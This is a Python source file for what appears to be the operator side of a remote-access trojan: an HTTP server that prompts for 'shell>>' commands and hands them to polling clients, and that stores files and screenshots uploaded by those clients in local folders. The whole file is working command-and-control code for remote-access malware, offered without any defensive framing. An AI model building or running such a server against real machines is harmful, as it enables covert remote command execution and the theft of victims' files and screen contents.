import http.server
from pathlib import Path
import random

ip = 'localhost'
port = 8080

class My_Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        command = input("shell>> ")
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):
        #DOWNLOAD FILES FROM CLIENTS
        if self.path == '/store':
            try:
                length = int(self.headers.get("Content-Length", "0"))
            except ValueError:
                print(400, "Invalid Content-Length")

            try:
                if length <= 0:
                    print(413, "Invalid file size")
                
                file_data = self.rfile.read(length)
                file_name = input("Enter File Name:>> ")

                UPLOAD_DIR = Path("Downloads")
                UPLOAD_DIR.mkdir(exist_ok=True)

                destination = UPLOAD_DIR / file_name
                destination.write_bytes(file_data)
                print(f"{file_name} has been saved to {destination}")

            except Exception as e:
                print("Error: ", e)

        #HANDLE SCREEN SHOTS
        if self.path == '/screen_shot':
            try:
                length = int(self.headers.get('Content-Length', "0"))

                if length <= 0:
                    print(413, "Invalid file size")

                file_data = self.rfile.read(length)
                numbers = random.randint(1, 1000)
                file_name = f"{numbers}.jpg"

                SCREEN_SHOTS_DIR = Path("Screen_Shots")
                SCREEN_SHOTS_DIR.mkdir(exist_ok=True)

                destination = SCREEN_SHOTS_DIR / file_name
                destination.write_bytes(file_data)
                print(f"saved to: >> {SCREEN_SHOTS_DIR}")

            except ValueError:
                print(400, "Invalid Content-Length")

            except Exception as e:
                print("Error: ", e)
            
        self.send_response(200)
        self.end_headers()
        length = int(self.headers["Content-Length"])
        PostVar = self.rfile.read(length)
        if PostVar:
            print(PostVar.decode("utf-8", errors="replace"))

if __name__ == "__main__":
    server_class = http.server.HTTPServer
    httpd = server_class((ip, port), My_Handler)

    try:
        print(f"Serving on {ip}:{port}")
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('[-]Closed')
        httpd.server_close()